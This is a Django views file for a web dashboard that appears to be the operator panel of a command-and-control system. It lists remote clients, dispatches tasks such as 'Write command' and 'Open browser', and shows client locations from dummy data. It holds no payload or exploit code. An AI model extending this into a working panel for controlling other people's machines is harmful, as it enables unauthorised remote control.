from django.shortcuts import render
from django.http import HttpResponseRedirect
from .forms import clientForm
from .models import Client, SentTask
from .filters import ClientFilter
from .server import ControlServerHandler
import json


def kill_task(request):
    # TODO: Send to control server
    return


def index(request):
    controlServer = ControlServerHandler()
    controlServer.getClients()

    tasks = [{'name': "Write command"}, {'name': "Open browser"}]

    if request.method == 'POST':
        form = clientForm(request.POST)
        if form.is_valid():
            controlServer.sendTasks(request)
            return HttpResponseRedirect(request.path_info)
    else:
        form = clientForm()

    dummyStatistics = {'num_clients': 23,
                       'top_os': 'windows',
                       'errors': 0}
    dummyLocations = {'locations': [[0, 0], [51.5, -0.09], [-0.09, 51.5]]}

    context = {'clients': Client.objects.all(),
               'tasks': tasks,
               'form': form,
               'statistics': dummyStatistics,
               'locations': json.dumps(dummyLocations),
               'filter': ClientFilter(request.GET, queryset=Client.objects.all())}

    return render(request, 'website/index.html', context, )


def tasks(request):
    controlServer = ControlServerHandler()
    controlServer.getTasks()
    
    if request.method == 'POST':
        controlServer.killTask(request)
        return HttpResponseRedirect(request.path_info)

    context = {'tasks': SentTask.objects.all().order_by('-id')[:200]}
    return render(request, 'website/tasks.html', context)
